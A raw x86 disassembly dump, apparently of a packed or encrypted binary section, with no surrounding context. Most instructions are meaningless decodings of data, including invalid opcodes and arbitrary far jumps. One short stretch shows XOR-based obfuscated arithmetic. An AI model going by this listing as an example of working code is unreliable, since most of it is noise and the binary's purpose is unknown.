  41ea6f:	mov    BYTE PTR [edx+0x431a7730],dh
  41ea75:	mov    edi,0x22e0e289
  41ea7a:	mov    ch,0xd7
  41ea7c:	test   DWORD PTR [edx],eax
  41ea7e:	repz mov ebp,0x32e0f3be
  41ea84:	out    dx,eax
  41ea85:	dec    edi
  41ea86:	in     eax,dx
  41ea87:	and    bh,al
  41ea89:	jno    0x41ea47
  41ea8b:	xor    dl,dh
  41ea8d:	std    
  41ea8e:	mul    DWORD PTR [ebx+0x1b94e16e]
  41ea94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea95:	xchg   edx,eax
  41ea96:	test   BYTE PTR [ebx-0x2f0c1bfc],bh
  41ea9c:	dec    ebx
  41ea9d:	js     0x41eb08
  41ea9f:	fstp   QWORD PTR [ebx]
  41eaa1:	jmp    0x41ea72
  41eaa3:	mov    eax,ds:0x3a8d421f
  41eaa8:	(bad)  
  41eaaa:	mov    WORD PTR [esi],ds
  41eaac:	lods   eax,DWORD PTR ds:[esi]
  41eaad:	aad    0x78
  41eaaf:	fs cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab2:	mov    bl,0xf5
  41eab4:	adc    esp,DWORD PTR [ecx+0x6c751e2a]
  41eaba:	stos   DWORD PTR es:[edi],eax
  41eabb:	push   0x6d
  41eabd:	push   eax
  41eabe:	dec    esi
  41eabf:	into   
  41eac0:	add    al,dl
  41eac2:	cmp    eax,0xf85ef79c
  41eac7:	adc    ecx,DWORD PTR [edx-0x5e7039b4]
  41eacd:	xor    esi,DWORD PTR [eax+0x4bf08e6e]
  41ead3:	inc    esi
  41ead4:	pop    ds
  41ead5:	sbb    dh,BYTE PTR [ebx-0x453c30d]
  41eadb:	fimul  DWORD PTR [ebp+0x4a1c19f]
  41eae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eae2:	leave  
  41eae3:	aam    0xae
  41eae5:	loope  0x41eb35
  41eae7:	push   esp
  41eae8:	xchg   esp,eax
  41eae9:	mov    eax,0x1701ff56
  41eaee:	cmp    eax,0xdcef1396
  41eaf3:	push   cs
  41eaf4:	xor    eax,edi
  41eaf6:	hlt    
  41eaf7:	(bad)  
  41eaf8:	fsub   st(5),st
  41eafa:	adc    eax,0x983bf690
  41eaff:	cmp    BYTE PTR [eax-0x2a6f012b],dh
  41eb05:	sbb    bl,al
  41eb07:	xor    ch,BYTE PTR [edx+0x571119ed]
  41eb0d:	push   0xffffffc5
  41eb0f:	jmp    0xf0e3:0xeb18f0a7
  41eb16:	test   BYTE PTR [ebx],dh
  41eb18:	iret   
  41eb19:	push   ebp
  41eb1a:	mov    ds:0x1815366,eax
  41eb1f:	jo     0x41eb3d
  41eb21:	adc    edx,edx
  41eb23:	mov    ecx,0x3b51ae07
  41eb28:	add    ebp,DWORD PTR [ecx]
  41eb2a:	and    eax,DWORD PTR [ebx+0x728f8e9e]
  41eb30:	(bad)  
  41eb32:	in     al,dx
  41eb33:	lods   al,BYTE PTR ds:[esi]
  41eb34:	sub    al,0x76
  41eb36:	imul   ebx,DWORD PTR [edx+0x1],0x69
  41eb3a:	cmp    esp,esp
  41eb3c:	inc    edx
  41eb3d:	fistp  DWORD PTR [eax]
  41eb3f:	cmp    DWORD PTR [ebp-0x1ae8bf0e],esp
  41eb45:	shr    DWORD PTR [ecx+ebp*1+0x1b],1
  41eb49:	out    0x7d,eax
  41eb4b:	jl     0x41eb3f
  41eb4d:	hlt    
  41eb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb4f:	or     edi,edx
  41eb51:	shl    BYTE PTR [esp+edx*4+0x55],1
  41eb55:	adc    BYTE PTR ds:0x359581b5,ah
  41eb5b:	xlat   BYTE PTR ds:[ebx]
  41eb5c:	pop    esi
  41eb5d:	pop    es
  41eb5e:	push   edi
  41eb5f:	or     ch,BYTE PTR [eax+0x2e1da0e8]
  41eb65:	inc    eax
  41eb66:	adc    DWORD PTR [esi+0x39],edi
  41eb69:	aam    0xc5
  41eb6b:	dec    eax
  41eb6c:	jmp    0xea6846b1
  41eb71:	retf   0x632d
  41eb74:	xor    cl,BYTE PTR [edi-0x3247f88]
  41eb7a:	inc    edx
  41eb7b:	mov    dl,0x9e
  41eb7d:	leave  
  41eb7e:	push   edx
  41eb7f:	add    edx,DWORD PTR ds:0x147aa03e
  41eb85:	cs (bad) 
  41eb87:	aas    
  41eb88:	xchg   edx,eax
  41eb89:	ret    
  41eb8a:	(bad)  
  41eb8b:	mov    es,WORD PTR [ebx]
  41eb8d:	cmp    eax,0x159dc09
  41eb92:	adc    eax,0x7f3f8aff
  41eb97:	xchg   ebx,eax
  41eb98:	outs   dx,DWORD PTR ds:[esi]
  41eb99:	dec    esi
  41eb9a:	stos   DWORD PTR es:[edi],eax
  41eb9b:	cdq    
  41eb9c:	cmp    al,0x58
  41eb9e:	in     al,dx
  41eb9f:	mov    ch,0xcd
  41eba1:	fwait
  41eba2:	sub    BYTE PTR [esi-0x1c],cl
  41eba5:	and    dh,BYTE PTR [ecx+0x67be2c87]
  41ebab:	mov    ?,WORD PTR [edi+0x34d1bbb3]
  41ebb1:	pop    es
  41ebb2:	add    dl,cl
  41ebb4:	push   cs
  41ebb5:	mov    edx,0x953893fa
  41ebba:	in     al,0xd8
  41ebbc:	cld    
  41ebbd:	dec    edx
  41ebbe:	xor    al,0x1a
  41ebc0:	ins    BYTE PTR es:[edi],dx
  41ebc1:	or     bl,BYTE PTR [ebx-0x70]
  41ebc4:	sbb    DWORD PTR ds:0x753273ea,eax
  41ebca:	pop    ecx
  41ebcb:	(bad)  
  41ebcc:	mov    ebx,0xb42713aa
  41ebd1:	shr    DWORD PTR [edi+0xcfa216d],cl
  41ebd7:	mov    ds:0x932a102,al
  41ebdc:	jge    0x41eb7b
  41ebde:	cs jnp 0x41eb92
  41ebe1:	pop    esp
  41ebe2:	daa    
  41ebe3:	inc    BYTE PTR [ecx+0x78]
  41ebe6:	inc    edx
  41ebe7:	xchg   esi,eax
  41ebe8:	dec    esp
  41ebe9:	ret    0x4384
  41ebec:	dec    ebx
  41ebed:	pop    edx
  41ebee:	js     0x41ec3e
  41ebf0:	fidivr DWORD PTR [eax+0xf]
  41ebf3:	inc    ecx
  41ebf4:	push   ds
  41ebf5:	nop
  41ebf6:	pop    ss
  41ebf7:	push   ecx
  41ebf8:	into   
  41ebf9:	imul   ebp,DWORD PTR [edx-0x66d9eb1b],0xffffffb1
  41ec00:	out    0x9c,al
  41ec02:	xor    ebp,ebx
  41ec04:	js     0x41ebed
  41ec06:	in     eax,0xa3
  41ec08:	je     0x41ec75
  41ec0a:	and    eax,DWORD PTR [ebp-0x61a637a5]
  41ec10:	iret   
  41ec11:	xlat   BYTE PTR ds:[ebx]
  41ec12:	adc    cl,BYTE PTR ds:[ecx+0x9514d9d]
  41ec19:	lock pop es
  41ec1b:	pop    esp
  41ec1c:	pusha  
  41ec1d:	push   0xffffff81
  41ec1f:	add    dl,BYTE PTR [esi]
  41ec21:	sub    esp,0x7b641745
  41ec27:	or     ebx,ecx
  41ec29:	push   eax
  41ec2a:	cld    
  41ec2b:	jp     0x41ebf7
  41ec2d:	dec    esi
  41ec2e:	cmp    al,0x4b
  41ec30:	aad    0x9b
  41ec32:	and    eax,0x69ea6315
  41ec37:	jns    0x41ec92
  41ec39:	call   0xb6a03348
  41ec3e:	test   eax,0x874bb906
  41ec43:	adc    dh,BYTE PTR [ebx+0x7392c0c6]
  41ec49:	lds    di,DWORD PTR [esi+0x5b45e77e]
  41ec50:	push   esp
  41ec51:	sbb    ah,BYTE PTR [ecx-0x1d96f56]
  41ec57:	ds in  eax,dx
  41ec59:	mov    esp,0xffd9b7ed
  41ec5e:	test   eax,0x4431344
  41ec63:	shl    BYTE PTR [esi-0x7f00e4d7],0xae
  41ec6a:	push   edi
  41ec6b:	jno    0x41ebee
  41ec6d:	cmp    ch,al
  41ec6f:	push   esp
  41ec70:	jb     0x41ebfa
  41ec72:	jae    0x41ecec
  41ec74:	mov    edi,0x6f0ff0dc
  41ec79:	call   0xf713:0xd6c33256
  41ec80:	out    dx,eax
  41ec81:	cwde   
  41ec82:	ret    
  41ec83:	aad    0x63
  41ec85:	adc    ch,BYTE PTR [eax+0x3118329a]
  41ec8b:	and    BYTE PTR [ebx-0x4b],bh
  41ec8e:	in     eax,0x56
  41ec90:	scas   eax,DWORD PTR es:[edi]
  41ec91:	out    0xcc,eax
  41ec93:	es psadbw mm4,mm5
  41ec97:	xor    edi,esp
  41ec99:	mov    cl,0x95
  41ec9b:	push   cx
  41ec9d:	lea    ebp,[ebx]
  41ec9f:	shl    BYTE PTR ds:0x71728dcb,1
  41eca5:	sbb    al,0x79
  41eca7:	dec    edi
  41eca8:	adc    ebp,ecx
  41ecaa:	sahf   
  41ecab:	jae    0x41ecd5
  41ecad:	sub    eax,0x6356a1d7
  41ecb2:	jmp    0x806f:0x43544a5d
  41ecb9:	jl     0x41ece1
  41ecbb:	outs   dx,BYTE PTR ds:[esi]
  41ecbc:	mov    WORD PTR [ebx],?
  41ecbe:	fcmovne st,st(6)
  41ecc0:	int    0xf5
  41ecc2:	ss loopne 0x41eccd
  41ecc5:	and    al,0x69
  41ecc7:	mov    esi,0xb9552847
  41eccc:	jne    0x41ed3d
  41ecce:	shl    BYTE PTR [ecx+0x52],cl
  41ecd1:	lds    eax,FWORD PTR [esi+0x2f]
  41ecd4:	sahf   
  41ecd5:	pop    es
  41ecd6:	fdivrp st(5),st
  41ecd8:	sbb    BYTE PTR [esi+0x34985c68],dh
  41ecde:	dec    eax
  41ecdf:	int3   
  41ece0:	mov    WORD PTR [ebx],?
  41ece2:	xchg   esp,eax
  41ece3:	pop    es
  41ece4:	mov    ebp,0x61d01f08
  41ece9:	pop    eax
  41ecea:	sub    al,0x12
  41ecec:	mov    ch,BYTE PTR [ebx-0x74581108]
  41ecf2:	jmp    0xc875bb22
  41ecf7:	mov    DWORD PTR [ebp+0x8],ecx
  41ecfa:	mov    ecx,DWORD PTR [ebp+0x8]
  41ecfd:	mov    edx,DWORD PTR [ebp+0x8]
  41ed00:	imul   edx,edx,0x5708f5
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0x31e70850
  41edcb:	pop    esp
  41edcc:	xlat   BYTE PTR ds:[ebx]
  41edcd:	test   eax,0x6261da83
  41edd2:	add    al,0x5f
  41edd4:	bound  esp,QWORD PTR [edx-0x39]
  41edd7:	jne    0x41ee03
  41edd9:	test   al,0x9d
  41eddb:	dec    edi
  41eddc:	loop   0x41ee07
  41edde:	retf   0x91c0
  41ede1:	aad    0x99
  41ede3:	cwde   
  41ede4:	mov    dl,bh
  41ede6:	cmp    BYTE PTR [esi+0x67d62ad],ch
  41edec:	aam    0x6a
  41edee:	xchg   esp,eax
  41edef:	adc    edi,DWORD PTR [ebx]
  41edf1:	test   DWORD PTR [eax+0x5b3aabcc],ebx
  41edf7:	jp     0x41edea
  41edf9:	fwait
  41edfa:	add    BYTE PTR [edi-0x4d],ah
  41edfd:	sbb    BYTE PTR [edx],dl
  41edff:	fwait
  41ee00:	dec    ebp
  41ee01:	sbb    ah,bl
  41ee03:	aaa    
  41ee04:	mov    dl,dh
  41ee06:	or     eax,0xb1793088
  41ee0b:	add    ecx,DWORD PTR [ebp-0x3b]
  41ee0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee0f:	sub    esp,DWORD PTR [ecx+0x23847b24]
  41ee15:	lock retf 
  41ee17:	div    DWORD PTR [eax-0x6]
  41ee1a:	in     eax,0x31
  41ee1c:	js     0x41edd7
  41ee1e:	and    al,0x3c
  41ee20:	cdq    
  41ee21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee22:	mov    edx,0xb8a2d99a
  41ee27:	pushf  
  41ee28:	mov    cl,0x87
  41ee2a:	ins    DWORD PTR es:[edi],dx
  41ee2b:	neg    ah
  41ee2d:	jo     0x41edea
  41ee2f:	aam    0x4d
  41ee31:	repnz dec edx
  41ee33:	add    BYTE PTR [ebx],0x18
  41ee36:	mov    cl,0x9d
  41ee38:	dec    ebp
  41ee39:	inc    edx
  41ee3a:	adc    eax,0x6475e0c9
  41ee3f:	xchg   esi,eax
  41ee40:	jmp    0xe2af:0x6f3f8b54
  41ee47:	inc    ebp
  41ee48:	in     al,dx
  41ee49:	loop   0x41ee26
  41ee4b:	sahf   
  41ee4c:	mov    cs,WORD PTR [ecx]
  41ee4e:	and    BYTE PTR [ecx],0x9a
  41ee51:	clc    
  41ee52:	jle    0x41ee6f
  41ee54:	sub    BYTE PTR [edi-0x4b],ah
  41ee57:	imul   ebp,DWORD PTR ds:0xe1c0773e,0x2c
  41ee5e:	pop    ds
  41ee5f:	je     0x41ee4a
  41ee61:	push   ecx
  41ee62:	pop    esp
  41ee63:	ins    BYTE PTR es:[edi],dx
  41ee64:	push   esp
  41ee65:	pop    ecx
  41ee66:	cmp    esp,ebx
  41ee68:	and    al,0xc2
  41ee6a:	mov    ch,BYTE PTR [edi+ecx*1-0x46]
  41ee6e:	sbb    al,0xd7
  41ee70:	lock in eax,dx
  41ee72:	ins    DWORD PTR es:[edi],dx
  41ee73:	imul   ecx
  41ee75:	test   eax,0x26e3f32f
  41ee7a:	rol    DWORD PTR [edx+0x22556abe],1
  41ee80:	jae    0x41eee9
  41ee82:	xchg   ebx,eax
  41ee83:	pop    esi
  41ee84:	mov    esp,0xfd8bfb3c
  41ee89:	pop    esi
  41ee8a:	inc    ecx
  41ee8b:	push   esp
  41ee8c:	mov    ecx,0xc272fdd2
  41ee91:	jp     0x41ee4e
  41ee93:	jbe    0x41eea8
  41ee95:	add    dh,bh
  41ee97:	push   esp
  41ee98:	inc    edx
  41ee99:	xchg   ebx,eax
  41ee9a:	stos   BYTE PTR es:[edi],al
  41ee9b:	mov    WORD PTR [edx-0x4ccd0a5e],?
  41eea1:	xor    eax,0xb08a0cb3
  41eea6:	popa   
  41eea7:	cmp    BYTE PTR [esi],0x36
  41eeaa:	pop    edx
  41eeab:	or     esi,DWORD PTR [ecx+0x4e4d4cc4]
  41eeb1:	(bad)  
  41eeb4:	lock lods al,BYTE PTR ds:[esi]
  41eeb6:	sbb    eax,0xc143df7b
  41eebb:	xor    BYTE PTR [edx+0xd],al
  41eebe:	in     al,0x53
  41eec0:	(bad)  
  41eec1:	popa   
  41eec2:	xor    esi,DWORD PTR ds:0x401341c
  41eec8:	inc    DWORD PTR [ebx]
  41eeca:	mov    gs,WORD PTR [eax-0x6b]
  41eecd:	push   eax
  41eece:	mov    cl,0xeb
  41eed0:	push   ebp
  41eed1:	sbb    bh,BYTE PTR [ebx]
  41eed3:	les    esp,FWORD PTR [ebp+0x6a6876fb]
  41eed9:	jmp    0xcdecef47
  41eede:	inc    ecx
  41eedf:	xchg   ch,dl
  41eee1:	test   DWORD PTR [esi+edi*8-0x40],ebx
  41eee5:	mov    ah,0x3e
  41eee7:	xor    BYTE PTR [edx-0x27],ah
  41eeea:	outs   dx,BYTE PTR ds:[esi]
  41eeeb:	mov    cl,BYTE PTR [edi+0x6f]
  41eeee:	pushf  
  41eeef:	mov    ebp,0x54b0d278
  41eef4:	(bad)  
  41eef5:	xchg   esp,eax
  41eef6:	in     al,0xf4
  41eef8:	pusha  
  41eef9:	cmp    si,WORD PTR [ebx-0x9fd0261]
  41ef00:	das    
  41ef01:	cdq    
  41ef02:	scas   al,BYTE PTR es:[edi]
  41ef03:	into   
  41ef04:	call   0x54032a22
  41ef09:	add    al,0x4a
  41ef0b:	rol    DWORD PTR [eax-0x643ff27b],cl
  41ef11:	lods   al,BYTE PTR ds:[esi]
  41ef12:	repnz rcr DWORD PTR [edi+0x3],cl
  41ef16:	sub    eax,0xa410455b
  41ef1b:	(bad)  
  41ef1c:	in     al,dx
  41ef1d:	and    esi,0xc03115d6
  41ef23:	sub    DWORD PTR [ecx+eiz*2+0x4447a88c],0xffffffe1
  41ef2b:	pop    ss
  41ef2c:	mov    edx,0x34dc9a16
  41ef31:	es and eax,0xf90cf52e
  41ef37:	(bad)  
  41ef39:	jns    0x41ef69
  41ef3b:	sub    edi,DWORD PTR [ecx]
  41ef3d:	push   ecx
  41ef3e:	imul   edi,esi,0x38
  41ef41:	adc    DWORD PTR [edi+edx*4+0x3],edi
  41ef45:	or     bl,BYTE PTR [ecx]
  41ef47:	adc    al,0x4
  41ef49:	into   
  41ef4a:	xchg   esi,eax
  41ef4b:	adc    al,0xde
  41ef4d:	push   ebp
  41ef4e:	leave  
  41ef4f:	sar    bl,0x28
  41ef52:	push   ebp
  41ef53:	xor    DWORD PTR [edx-0x50],ebp
  41ef56:	retf   
  41ef57:	leave  
  41ef58:	and    al,BYTE PTR [ebp-0x80]
  41ef5b:	xchg   ebx,eax
  41ef5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5d:	xchg   DWORD PTR [edx+0x2d89260b],ecx
  41ef63:	add    esp,ecx
  41ef65:	adc    al,0xf1
  41ef67:	loope  0x41eeff
  41ef69:	add    DWORD PTR [ebx+0x55ccf7ed],edi
  41ef6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef70:	outs   dx,BYTE PTR ds:[esi]
  41ef71:	scas   al,BYTE PTR es:[edi]
  41ef72:	push   cs
  41ef73:	rol    bl,cl
  41ef75:	fs pop es
  41ef77:	pushf  
  41ef78:	adc    dl,BYTE PTR [edx+0x40]
  41ef7b:	xor    al,0x4d
  41ef7d:	adc    ebp,DWORD PTR [ecx]
  41ef7f:	xlat   BYTE PTR ds:[ebx]
  41ef80:	adc    BYTE PTR [ebx+eiz*4],dl
  41ef83:	mov    ebp,0x4cd3771f
  41ef88:	xor    eax,0xfb5ae12b
  41ef8d:	mov    bh,0x5
  41ef8f:	or     esi,esp
  41ef91:	pop    ebp
  41ef92:	enter  0x7768,0x5f
  41ef96:	xchg   ecx,eax
  41ef97:	aas    
  41ef98:	mov    esi,0x9ddcfd47
  41ef9d:	stos   BYTE PTR es:[edi],al
  41ef9e:	inc    ebp
  41ef9f:	loope  0x41ef44
  41efa1:	xchg   ecx,eax
  41efa2:	pop    esp
  41efa3:	mov    esp,0xd1c7e62d
  41efa8:	jge    0x41efc6
  41efaa:	cmp    cl,BYTE PTR [eax+0xc]
  41efad:	adc    BYTE PTR [edx+ebp*1+0x6ace8efc],dl
  41efb4:	jb     0x41ef37
  41efb6:	dec    ecx
  41efb7:	int3   
  41efb8:	mov    edi,0xc14bfcb2
  41efbd:	stos   BYTE PTR es:[edi],al
  41efbe:	or     BYTE PTR [esp+ebp*2-0x7c],al
  41efc2:	mov    ah,0xd3
  41efc4:	mov    cl,0xc3
  41efc6:	out    0xdf,al
  41efc8:	fstp   DWORD PTR [eax]
  41efca:	mov    edx,0xb07662cb
  41efcf:	int    0x73
  41efd1:	gs retf 0x8d4c
  41efd5:	loope  0x41f038
  41efd7:	aas    
  41efd8:	inc    esi
  41efd9:	mov    al,0x61
  41efdb:	mov    edi,ecx
  41efdd:	in     al,dx
  41efde:	ds rol esp,1
  41efe1:	mov    al,0x71
  41efe3:	cmp    BYTE PTR [edi+ecx*8+0x6606609c],ah
  41efea:	inc    edx
  41efeb:	jno    0x41f006
  41efed:	mov    al,0x4e
  41efef:	jmp    0x82f34de3
  41eff4:	xor    ebp,ecx
  41eff6:	sub    bl,BYTE PTR [edi-0x50ea4752]
  41effc:	or     esp,DWORD PTR [edx]
  41effe:	xchg   esi,eax
  41efff:	sub    al,0x35
  41f001:	outs   dx,DWORD PTR cs:[esi]
  41f003:	jno    0x41f065
  41f005:	pop    ecx
  41f006:	addr16 dec ecx
  41f008:	jbe    0x41efd1
  41f00a:	ret    0x517f
  41f00d:	jnp    0x41f088
  41f00f:	jb     0x41effa
  41f011:	mov    esp,0x2c32cecf
  41f016:	popf   
  41f017:	call   0x6ad7001b
  41f01c:	mov    al,ds:0x78d70eb4
  41f021:	mov    dl,0xf0
  41f023:	imul   BYTE PTR [ecx+0x303bb048]
  41f029:	rcr    esi,cl
  41f02b:	ja     0x41effa
  41f02d:	jp     0x41f0a9
  41f02f:	cmp    BYTE PTR [ecx],dl
  41f031:	retf   
  41f032:	jnp    0x41efc2
  41f034:	ret    0x2825
  41f037:	in     al,0xf2
  41f039:	sub    al,0xfe
  41f03b:	xlat   BYTE PTR ds:[ebx]
  41f03c:	and    eax,0xbeadafb6
  41f041:	scas   al,BYTE PTR es:[edi]
  41f042:	aam    0x6e
  41f044:	les    esi,FWORD PTR [edx]
  41f046:	jmp    0xf3b7:0x3a8959ca
  41f04d:	pop    ecx
  41f04e:	xchg   edx,eax
  41f04f:	ds (bad) 
  41f051:	fld    st(2)
  41f053:	jl     0x41f06f
  41f055:	adc    BYTE PTR [ecx-0x5579b4c9],dl
  41f05b:	dec    bl
  41f05d:	gs and al,0x96
  41f060:	les    edi,FWORD PTR [esi-0x24868bf0]
  41f066:	xor    DWORD PTR [edx+0x43df881],ebp
  41f06c:	push   ecx
  41f06d:	inc    ecx
  41f06e:	dec    edi
  41f06f:	das    
  41f070:	push   ecx
  41f071:	xor    dl,dh
  41f073:	mov    esp,0x8c54aa75
  41f078:	mov    ecx,0xff602a3
  41f07d:	ins    DWORD PTR es:[edi],dx
  41f07e:	inc    BYTE PTR [eax]
  41f080:	ins    DWORD PTR es:[edi],dx
  41f081:	lods   eax,DWORD PTR ds:[esi]
  41f082:	retf   
  41f083:	or     edx,DWORD PTR [ebp-0x1d]
  41f086:	data16 in al,0xb
  41f089:	xor    edx,DWORD PTR ds:0xd9a275ca
  41f08f:	mov    DWORD PTR [ecx-0x6a9a0c44],esp
  41f095:	fstp   DWORD PTR [eax]
  41f097:	jle    0x41f02a
  41f099:	or     esp,DWORD PTR [ebp+0x10]
  41f09c:	pop    ecx
  41f09d:	mov    edi,0x913675e
  41f0a2:	(bad)  
  41f0a3:	fdiv   st,st(4)
  41f0a5:	sub    esi,DWORD PTR ds:0x393150e9
  41f0ab:	hlt    
  41f0ac:	adc    esi,esi
  41f0ae:	jmp    0x1ebf747
  41f0b3:	sti    
  41f0b4:	dec    ebp
  41f0b5:	push   edx
  41f0b6:	push   esi
  41f0b7:	test   eax,0xbb51f500
  41f0bc:	mov    eax,0x12e389a1
  41f0c1:	mov    ah,0x1f
  41f0c3:	xor    ecx,ebp
  41f0c5:	test   eax,0xcf6efcf2
  41f0ca:	pusha  
  41f0cb:	stos   DWORD PTR es:[edi],eax
  41f0cc:	adc    DWORD PTR [edi],ecx
  41f0ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0cf:	add    esi,DWORD PTR [edi-0x4e]
  41f0d2:	mov    esp,0x7aa7d5c1
  41f0d7:	mov    bh,0x66
  41f0d9:	sub    eax,0xcfeffdb0
  41f0de:	popa   
  41f0df:	add    al,0x7d
  41f0e1:	daa    
  41f0e2:	pop    edx
  41f0e3:	fiadd  DWORD PTR [esi+0x7a188ba7]
  41f0e9:	mov    ds:0x10e1d998,eax
  41f0ee:	ret    0xdde0
  41f0f1:	adc    ebx,DWORD PTR [edi+0x22b50445]
  41f0f7:	pop    edx
  41f0f8:	lea    ebp,[eax-0x13]
  41f0fb:	jecxz  0x41f15a
  41f0fd:	xor    al,BYTE PTR [ecx-0x4db79246]
  41f103:	or     BYTE PTR [edi+0x46774007],0x9c
  41f10a:	xor    DWORD PTR [esi+edi*8-0x6e],ebx
  41f10e:	aam    0xb4
  41f110:	je     0x41f12d
  41f112:	hlt    
  41f113:	clc    
  41f114:	xchg   BYTE PTR [ebx+eax*4+0x37],cl
  41f118:	sbb    ecx,esi
  41f11a:	fnsave [ecx-0x7a]
  41f11d:	jno    0x41f158
  41f11f:	dec    ecx
  41f120:	jecxz  0x41f0dd
  41f122:	pop    esi
  41f123:	ins    DWORD PTR es:[edi],dx
  41f124:	mul    DWORD PTR [edi]
  41f126:	(bad)  
  41f127:	repnz aaa 
  41f129:	jmp    0x41f100
  41f12b:	jno    0x41f160
  41f12d:	mov    al,ds:0xb634ff33
  41f132:	mov    ds:0x92e5997,al
  41f137:	gs mov bl,0x15
  41f13a:	pop    esp
  41f13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f13c:	or     al,0xc
  41f13e:	test   al,0x48
  41f140:	and    eax,0xed19d6e2
  41f145:	lock call 0xceda:0x61ce1231
  41f14d:	xor    BYTE PTR [ecx],ah
  41f14f:	and    ch,0xd0
  41f152:	xor    DWORD PTR cs:[eax+0x5f2b1e9e],eax
  41f159:	pop    ecx
  41f15a:	sbb    cl,BYTE PTR [eax-0x3f8e2433]
  41f160:	jb     0x41f0ed
  41f162:	(bad)  
  41f163:	loop   0x41f105
  41f165:	sbb    BYTE PTR [ebx-0x79],0xb6
  41f169:	cdq    
  41f16a:	ja     0x41f0f2
  41f16c:	imul   ebx,DWORD PTR [eax+ebp*8-0x68],0xc4005e3b
  41f174:	(bad)  
  41f175:	lea    edi,[edi+0x71407d27]
  41f17b:	mov    edi,0xfaa7d5f2
  41f180:	push   cs
  41f181:	mov    al,ds:0xbd72e3f0
  41f186:	int3   
  41f187:	or     al,0x1a
  41f189:	fwait
  41f18a:	mov    eax,0x6ad913d1
  41f18f:	fisubr DWORD PTR [ebx]
  41f191:	cmc    
  41f192:	mov    ds:0x10dc2c5f,al
  41f197:	inc    ebx
  41f198:	mov    cl,0x3b
  41f19a:	push   esi
  41f19b:	arpl   bx,bx
  41f19d:	mov    ecx,0x8d3eead7
  41f1a2:	jnp    0x41f1d7
  41f1a4:	in     eax,0x10
  41f1a6:	mov    ebx,0xf6428d5b
  41f1ab:	xchg   ecx,eax
  41f1ac:	je     0x41f17d
  41f1ae:	sub    DWORD PTR ds:0xbdd01bcd,esi
  41f1b4:	mov    ds,WORD PTR [ecx]
  41f1b6:	nop
  41f1b7:	or     al,0x9c
  41f1b9:	sti    
  41f1ba:	nop
  41f1bb:	sti    
  41f1bc:	or     edx,DWORD PTR [ebx-0x39]
  41f1bf:	sti    
  41f1c0:	xchg   ecx,eax
  41f1c1:	jmp    0x41f157
  41f1c3:	jbe    0x41f17e
  41f1c5:	xor    edx,DWORD PTR [eax-0x56d016dd]
  41f1cb:	inc    esp
  41f1cc:	sbb    eax,esi
  41f1ce:	sub    DWORD PTR [eax+0x58f4f6e9],edx
  41f1d4:	xchg   ebp,eax
  41f1d5:	ret    0xce87
  41f1d8:	or     dl,dl
  41f1da:	xor    BYTE PTR [eax+0x13],dl
  41f1dd:	(bad)  
  41f1de:	in     eax,0xef
  41f1e0:	sbb    bl,BYTE PTR [eax-0x26]
  41f1e3:	in     eax,0x55
  41f1e5:	les    ebp,FWORD PTR [edi]
  41f1e7:	sub    ebx,eax
  41f1e9:	push   0x57b85d0b
  41f1ee:	push   ss
  41f1ef:	sbb    eax,0x34ca7207
  41f1f4:	out    0x90,eax
  41f1f6:	push   edx
  41f1f7:	cmp    al,0x80
